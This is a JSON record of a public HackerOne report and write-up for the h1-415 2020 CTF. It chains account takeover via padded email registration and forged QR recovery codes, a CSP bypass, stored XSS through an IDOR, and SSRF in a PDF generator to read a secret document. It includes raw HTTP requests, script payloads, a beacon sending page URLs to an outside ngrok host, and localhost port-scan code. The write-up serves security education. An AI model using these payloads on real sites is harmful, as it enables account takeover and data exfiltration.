{
  "id": 780036,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODAwMzY=",
  "url": "https://hackerone.com/reports/780036",
  "title": "[h1-415 2020] Multiple vulnerabilities leading to leaking of secret user files",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-01-22T04:10:02.230Z",
  "submitted_at": "2020-01-22T04:10:02.230Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nukedx",
    "url": "/nukedx",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-02-03T20:35:38.846Z",
  "bug_reporter_agreed_on_going_public_at": "2020-02-03T20:35:38.772Z",
  "team_member_agreed_on_going_public_at": "2020-02-03T20:34:44.833Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\n\nI'm just submitting both flags for CTF, will send my write up on hacker summary, since it's 7:00 am now :).\n\nOriginal flag for CTF: `h1ctf{y3s_1m_c0sm1c_n0w}`\nExtra flag for unintended account takeover: `h1ctf{wtf_1s_happ3ning_w1th_th1s_s1mulat1on}`\n\nSincerely,\n@nukedx\n\n## Impact\n\nBy chaining multiple vulnerabilities attacker can leak secret user files.",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 692180,
      "file_name": "0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bN2hNmDenaCXMC2xA325h9cz?response-content-disposition=attachment%3B%20filename%3D%220d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf%22%3B%20filename%2A%3DUTF-8%27%270d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf&response-content-type=application%2Fpdf&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133554Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=26c79f60b56f5c1cf6239556454444ed567acbfc204317eefff0db937e051806",
      "file_size": 60409,
      "type": "application/pdf",
      "moderated": null
    },
    {
      "id": 692181,
      "file_name": "2763.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rdZZKo6PLeg9tTrQMWd2s1Z2?response-content-disposition=attachment%3B%20filename%3D%222763.png%22%3B%20filename%2A%3DUTF-8%27%272763.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133554Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ec64fee44b543d0a4a48d519b68bd9aa756971563a82aacf227434bf62779139",
      "file_size": 96756,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-03-04T20:34:44.933Z",
  "allow_singular_disclosure_after": -124477269.3810557,
  "singular_disclosure_allowed": true,
  "vote_count": 56,
  "voters": [
    "nytr0gen",
    "hipotermia",
    "checkm50",
    "mashoud1122",
    "gevakun",
    "base_64",
    "0xacb",
    "sameerphad72",
    "tess",
    "dmc3",
    "and 46 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 42751,
    "asset_type": "URL",
    "asset_identifier": "h1-415.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 19873,
      "category": "researcher",
      "content": "## Beginning of event\nThis is my friend Jobert:\n\n{F692973}\n\nOn January 16th, HackerOne's official twitter account posted a tweet about Jobert lost access to his account and lost an important document. Which stumbled upon on me. I wanted to help my friend and started to check service provider located on https://h1-415.h1ctf.com\n\n## Analysing the target with visual recon\n\nStarted to check https://h1-415.h1ctf.com with visual recon, noticed that some customers had their testimonials, interestingly Jobert provided one too. While inspecting his testimonial noticed he had email address referenced for it.\n{F692986}\n\nEmail address referenced was: `jobert@mydocz.cosmic`\n\nSince everyone could sign-up to the service, I tried to register with `jobert@mydocz.cosmic` as email address and got an error **Something went wrong, please try again with a different email address or username.**.\n\nIt was clear that Jobert's email on testimonial was used. So registered an account with my own email, after successfully registering account a QR code generated by service and mentioned that it could be used for recovering the account: `Please take some time to save this QR code if you ever need to recover your account in the future.`, saved the QR and moved to analyse features on service.\n\nThere was a support page which was clearly mentioning: `Support chat is available for customers only.` Since account we created was trial account we were not qualified for it, that looks like some feature we must check later on.\n\nMoved to settings feature and it was having an option to change our name, decided to check if it's sanitizing special chars to prevent potential attacks, it was sanitizing following characters: `<>{}`. Therefore using it for any kind of stored XSS was not possible, also tried to see the limit on character length for username, noticed that whenever we exceed 128 chars it was giving internal server error, noted it down and moved to next feature.\n\nConverter feature clearly mentioned that we can only upload following file types: **PNG** and **JPG** but only thing it was doing checking file extension, so it was possible to upload any content with that extensions but looks like pdf generation was just referencing them from `<img>` tag on page it renders so it wasn't possible to abuse it unless we can find some LFI.\n\nSince we noticed character length limit on username, decided to check it on for other fields of the register page, looks like it was also applied for email and username as well, also it was possible to create an account with empty username.\n\nOnly thing left to check was how user session handled, looks like session cookie set as **HttpOnly** so leaking it with any stored XSS would nearly impossible unless we find an endpoint sending it as a response and `_csrf_token` is just used for a regular anti-CSRF mechanism.\n\n## Using data gained from visual recon \n\nSo far we found out potential email address of Jobert's account, account recover mechanism with QR code, session cookie is HttpOnly, character limits on email, name and username of account.\n\nStarted with analysing session cookie, session cookie looked like Flask cookie and decoding it actually revealed something interesting for doing it used **flask-unsign**.\n```\nflask-unsign --unsign --cookie .eJxdy8EKwjAMANB_yXlI06at7cn_EClZlqHoNlnrQcR_d-BJj-_wXlCkrmNpy1VnyECcQkzWR6HBhGSIxbDrESlhb8l5GREHNtCBnLlBPp460Ikvty03rQ2tIx_iPh1-tJNl2s6j6lra866Q3VczT_pf4f0BC4UsGQ.Xid9Mg.l1KyB_ywBm-_bhoHx86iKQnMgvc\n\n[*] Session decodes to: {'_csrf_token': '4a9679257c4d06904ac0a3b11491b2435cf11da0', 'chat': [], 'email': 'test123456789@test123456789.com', 'user_type': 3, 'username': 'test123456789'}\n```\nIt was clear that session cookie do not store users password, which is good to know but since we do not have the secret key for it, it was impossible to generate a new one.\n\nDecided to decode QR code, for it just used online service from [ZXing](https://zxing.org/w/decode.jspx):\n```\n7465737431323334353637383940746573743132333435363738392e636f6d:f7ab97879d467bace879071789e097ed65508b93399941854c76a1e353b1df4a7b8259faefbaacbdf8686afbcb65ee03b7e10c3e58b4f47b7ffa4c277fb7a9ae8ade8e3316737c83406a643e3f99106cfb824287c28004a1aa1b417d102db69b641b7a2fdad1bdd699efe13cd0671df265f4efe02efa6af8004b73bd270545d7\n```\n\nWhich looked like bunch of hashes dancing together, except there was a semicolon between them, so checked first part which was not fitting any known hash length, it was clearly hex values of email address I used: `test123456789@test123456789.com`\n\nSo decided to create a new QR code with Jobert's email via using [QR code generator](https://www.the-qrcode-generator.com/):\n\n```\n6a6f62657274406d79646f637a2e636f736d6963:f7ab97879d467bace879071789e097ed65508b93399941854c76a1e353b1df4a7b8259faefbaacbdf8686afbcb65ee03b7e10c3e58b4f47b7ffa4c277fb7a9ae8ade8e3316737c83406a643e3f99106cfb824287c28004a1aa1b417d102db69b641b7a2fdad1bdd699efe13cd0671df265f4efe02efa6af8004b73bd270545d7\n```\n\nWhen used new generated QR, got an error: `Invalid code` it was clear that we should find a way to recover that account.\n\n## Discovering ways to account takeover\n\nSince QR code we generated failed decided to mess with register page, so far we know character limit and sanitized characters.\n\nFirst way I tried was sending null-byte and new line characters at the end of email address, noticed I was able to create accounts with them but they were included on cookie like:\n```\n{'_csrf_token': '20bc6e86d195d103d2d8bfe132cf9484e6cc4bf7', 'chat': [], 'email': 'jobert@mydocz.cosmic\\n', 'user_type': 3, 'username': '1'}\n```\n\nSo it wasn't actually checking if there was invalid character at the end of email address but failed, I decided to use an old trick from early 2000s filling it with spaces till 128th char and putting new line at the end as 129th char.\n\nRequest payload looked like this: \n```\nPOST /register HTTP/1.1\nHost: h1-415.h1ctf.com\nConnection: close\nContent-Length: 273\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://h1-415.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4017.0 Safari/537.36 Edg/81.0.389.2\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://h1-415.h1ctf.com/register\nAccept-Encoding: gzip, deflate\nAccept-Language: tr,en-US;q=0.9,en;q=0.8\nCookie: _csrf_token=3390a87b98128fe01be7fa3f615aced12ea1dae1; session=eyJfY3NyZl90b2tlbiI6IjMzOTBhODdiOTgxMjhmZTAxYmU3ZmEzZjYxNWFjZWQxMmVhMWRhZTEifQ.XiV2HQ.n04p8L9_-rBZgpUq6FCI-LoRelc\n\nname=test&email=jobert@mydocz.cosmic+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0a&username=13&password=test123456789&password-confirmation=test123456789&_csrf_token=3390a87b98128fe01be7fa3f615aced12ea1dae1\n```\n\nInterestingly that worked like a charm and I was able to register account with it and session cookie looked like this:\n\n```\n{'_csrf_token': '3390a87b98128fe01be7fa3f615aced12ea1dae1', 'chat': [], 'email': 'jobert@mydocz.cosmic                                                                                                            \\n', 'user_type': None, 'username': None}\n```\n\nIt somehow didn't have user_type and username.\n\nI was able to login with jobert@mydocz.cosmic with password test123456789 but this didn't feel like intended way. Since I was able to make another jobert@mydocz.cosmic account with different password and being able to login with both but not actually with jobert's username by using the passwords. It looked like some issue on backend actually was causing it, even session cookie was able to confirm it, since it had all the spaces.\n\nWhen logged in session cookie was like this:\n```\n{'_csrf_token': '3390a87b98128fe01be7fa3f615aced12ea1dae1', 'chat': [], 'email': 'jobert@mydocz.cosmic                                                                                                            ', 'user_type': 2, 'username': 'jobert'}\n``` \n\nIt clearly removed **\\n** but was filled with spaces.\n\nSince Jobert's user_id was 2, there should be another account I tried `admin@mydocz.cosmic` for it and I was actually able to takeover it too and it's userid was 1 but there wasn't so much to do with it, later reported it and this was actually unintended way to take account as mentioned on:\n\n{F692181}\n\nSo there should be also intended way to takeover Jobert's account since we could add any char at the end of email I wanted to add sanitized chars like `<<`\n\nWe got a new QR code for registering an account:\n\n{F692972}\n\nWhen decoded it looked like this: \n```\n6a6f62657274406d79646f637a2e636f736d6963:c2fc8b13780eeced250ec5daf3a47451b3ad412b9ecd2cd4a70c0de3a8ee9043212c7d5a0d20bc0c67095f2b876ab83cdc9e20747bb44bfe33ebf0ebac715133d33537477d9c999c41efa1321534e75877ba1b298276123136774db04a6623677afb1db708b0517a11487007dfc72a6909a4815ed86b3eb9d74e029cf2be91bb\n```\n\nResult was perfect we were able to generate valid QR code for Jobert's email and `<<` got sanitized, now we need to test if we can login with it and when logged in session cookie looked like this: \n```\n{'_csrf_token': 'ac1ea8ac0e6c6931243e9928f067212c0d899a3d', 'chat': [], 'email': 'jobert@mydocz.cosmic', 'user_type': 2, 'username': 'jobert'}\n```\n\nSo it was successful and we are now able to login with Jobert's account by using QR code.\n\nInterestingly session cookie of original account of the which generated QR looked liked this:\n```\n{'_csrf_token': 'ac1ea8ac0e6c6931243e9928f067212c0d899a3d', 'chat': [], 'email': 'jobert@mydocz.cosmic<<', 'user_type': 3, 'username': 'test1234567891'}\n```\n\nSo unintended way actually doing weird interactions with backend and potentially database server itself, because unlike sanitized versions cookie unintended way was missing user_type and username values on cookie.\n\n## Checking new features\n\nSince I was able to login as Jobert first thing I checked was documents but looks like we got rick rolled there is no documents on that account. \n\nJobert's account had access for the support since he was legit customer and support chat looks like vulnerable to stored XSS but due to CSP filters we can't use scripts unless we bypass it.\n\nAccording to this script when we rate support we received with 1 star a support person will review it.\n\n```javascript\n    $(\"#rating-input\").val(rating), 1 === rating && $(\"#report-message\").text(\"We're sorry about that. Our team will review this conversation shortly.\"), $(\"#review-button\").attr(\"disabled\", !1)\n```\n\nBy simply using \"<img>\" I verified that I received a new connection on it with interesting user-agent:\n\n```\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\n```\n\nSo decided to check CSP filters, seeing that `https://raw.githack.com/mattboldt/typed.js/master/lib/` allowed to reference scripts checked [GitHack](https://raw.githack.com), I could reference my own github but link looked like `https://raw.githack.com/mcipekci/ch/master/c.js`\n\nFor fooling browser I decided to use double encoding because backend will replace %2F with / so needed to have %2F on browser therefore when it makes request to githack, will remove trailing slashes so first payload looked like:\n\n```\n<script src=\"https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fmcipekci/ch/master/c.js\"></script>\n```\n\nThis was bypassing it but there was another trick too (thanks to checkm50)\n\n```\n<script src=\"https://raw.githack.com/mattboldt/typed.js/master/lib/@https://raw.githubusercontent.com/mcipekci/ch/master/c.js\"></script>\n```\n\nWith both ways I was able to execute scripts but due to CSP filters we couldn't exfill data via XHR and since session cookie was HttpOnly, it wasn't worth to get that cookie, only thing left is getting address of support.\n\n```javascript\nvar img = document.createElement('img'); \t\nimg.src = 'https://473610be.ngrok.io/w.png?c='+document.location;\ndocument.body.appendChild(img);\n```\n\nBy using this I was able to locate supports address\n\n```\nGET /w.png?c=http://localhost:3000/support/review/1194a0909bd5e05ded45214d54c559e708cd2131488a483b350ceedbbbbc7ddf HTTP/1.1\nHost: 473610be.ngrok.io\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: no-cors\nReferer: http://localhost:3000/\nAccept-Encoding: gzip, deflate, br\nX-Forwarded-Proto: https\nX-Forwarded-For: 18.218.90.126\n```\n\n{F694403}\nThings started to look interesting support page looks like was vulnerable to improper access control, so whoever had address of the page can access it but whenever we tried to save user it was giving can't update this user error.\n\n## Chaining IDOR and stored XSS to finding missing file via SSRF\n\nSince I had the link of supports review page noticed that there was a `user_id` parameter decided to change it to my trials user id and realised that unlike register and users own settings page no sanitize applied for special chars on users name but payload was limited, so used `<script>` tag to load remote javascript, since pdf generators ignore CSP rules but directly rely html code for rendering, I used script from my own server.\n\n```\nPOST /support/review/1194a0909bd5e05ded45214d54c559e708cd2131488a483b350ceedbbbbc7ddf HTTP/1.1\nHost: h1-415.h1ctf.com\nConnection: close\nContent-Length: 123\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://h1-415.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4017.0 Safari/537.36 Edg/81.0.389.2\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://h1-415.h1ctf.com/support/review/1194a0909bd5e05ded45214d54c559e708cd2131488a483b350ceedbbbbc7ddf\nAccept-Encoding: gzip, deflate\nAccept-Language: tr,en-US;q=0.9,en;q=0.8\nCookie: _csrf_token=43701321f1d6febd05143e22473097dbd0ad2adf; session=eyJfY3NyZl90b2tlbiI6IjQzNzAxMzIxZjFkNmZlYmQwNTE0M2UyMjQ3MzA5N2RiZDBhZDJhZGYifQ.Xih9mg.4crzJQ_QGe46WyBiGGEg_P266Rs\n\nname=<script src=\"http://worker.nukedx.com/t4.js\"></script>&user_id=11&_csrf_token=43701321f1d6febd05143e22473097dbd0ad2adf\n```\n\nThanks to stored XSS via IDOR now we are able to fire SSRF on pdf generator but we are again limited since we can't access metadata to reveal SSH keys, only thing left to do was doing port scan, decided to use following script to scan local ports for any other web page.\n\n```javascript\nvar i = 0;\nvar k = i + 500;\nfor (;i<k; i++){\n document.write(\"<br/><b>Port:\"+i+\"</b><iframe src='http://localhost:\"+i+\"' width='1000' height='300' frameBorder='0'></iframe><br/>\");\n}\n```\n\nI decided to scan 500 ports each time because when I added more pdf generation was failing so after some time I found out that Chrome's default remote debugging port (9222) was accessible, you can find outputs of the scan on {F692971}\n\n{F692970}\n\nSince we can access that decided to use following script for loading it on pdf:\n\n```javascript\nvar i=9222;\ndocument.write(\"<br/><b>Port:\"+i+\"</b><iframe src='http://localhost:\"+i+\"/json' width='1000' height='1000' frameBorder='0'></iframe><br/>\");\n```\n\n{F692969}\n\nNow I found out that `http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf`\n\nWanted to go for [this](https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf) web page since we could share documents with our friends according to Jobert's testimonial on login page.\n\n`I love My Docz Converter! It's easy to use and secure. I can share documents with my friends.`\n\nFlag was stored on it: **h1ctf{y3s_1m_c0sm1c_n0w}** {F692180}\n\n## Journey of curiosity\n\nFurthermore receiving flag for unintended account takeover: **h1ctf{wtf_1s_happ3ning_w1th_th1s_s1mulat1on}**\n\nI decided to dig it more because it wasn't feeling correct and my curiosity was tempting me and applied same logic to username itself by using such request:\n```\nPOST /register HTTP/1.1\nHost: h1-415.h1ctf.com\nConnection: close\nContent-Length: 286\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://h1-415.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4017.0 Safari/537.36 Edg/81.0.389.2\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://h1-415.h1ctf.com/register\nAccept-Encoding: gzip, deflate\nAccept-Language: tr,en-US;q=0.9,en;q=0.8\nCookie: _csrf_token=48c181397836e88979a3dcbe000856320ec5f829; session=eyJfY3NyZl90b2tlbiI6IjQ4YzE4MTM5NzgzNmU4ODk3OWEzZGNiZTAwMDg1NjMyMGVjNWY4MjkifQ.Xijq_Q.v_EEgJoyHr08l8qoLb-v6A_izrI\n\nname=test&email=2jt@jt.com&username=jobert+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0a&password=1test123456789&password-confirmation=1test123456789&_csrf_token=48c181397836e88979a3dcbe000856320ec5f829\n```\n\nWhich actually worked and let me create a new account it's session cookie looks like this:\n\n```\n{'_csrf_token': '48c181397836e88979a3dcbe000856320ec5f829', 'chat': [], 'email': '2jt@jt.com', 'user_type': 3, 'username': 'jobert              '}\n```\nApperantly backend was setting user_type by matching email address but not the username itself from the login, which explains all QR code stuff, then I logged with jobert's username confirmed it since it had trial tag on it.\n{F693403}\n\nFirst thing I tried changing name of user and I was actually able to do it then logged with jobert@mydocz.cosmic and confirmed that I was able to update name to Jobert2.\n\n{F693402}\n\nSecondly I tried to upload file on jobert's username and it was also successful\n\n{F693400}\n\nAgain logged with jobert@mydocz.cosmic and verified it was also successful\n\n{F693401}\n\nIt's also clear that username and documents assigned to userid itself unlike the access of users permissions, like jobert account with trial permissions couldn't interact with support despite being exact same userid with original jobert account.\n\nIt was really fun to find such stuff :).\n\n## Closing thoughts\n\nThis CTF actually helped me to analyse things more better and stop overthinking, because sometimes we need to stop making assumptions and follow the flow of basic things. \n\nIt was very well managed and fun challenges was there.\n\nHats off to Mr @0xacb a.k.a 2763 ;) and @nahamsec\n\nI also would like to thank @Al-Madjus, @checkm50 and @manoelt from H101 discord for their time and letting me realize things more clearly.\n\nUnfortunately I can not attend event, due to some family reasons. if I win via this write-up which I do not think, so please exclude me from that :)\n\nI feel like c0sm1c now\n{F693204}\n## References\n1. https://zxing.org/w/decode.jspx\n1. https://www.the-qrcode-generator.com/\n1. https://h1-415.h1ctf.com/js/support.min.js\n1. https://raw.githack.com\n1. https://mango.pdf.zone/stealing-chrome-cookies-without-a-password\n1. https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",
      "user": {
        "id": 404926,
        "username": "nukedx",
        "name": "Mustafa Can IPEKCI",
        "bio": "Just here for fun",
        "cleared": true,
        "verified": true,
        "website": "https://www.nukedx.com",
        "location": "milw0rm",
        "created_at": "2018-11-13T13:33:43.946Z",
        "url": "https://hackerone.com/nukedx",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
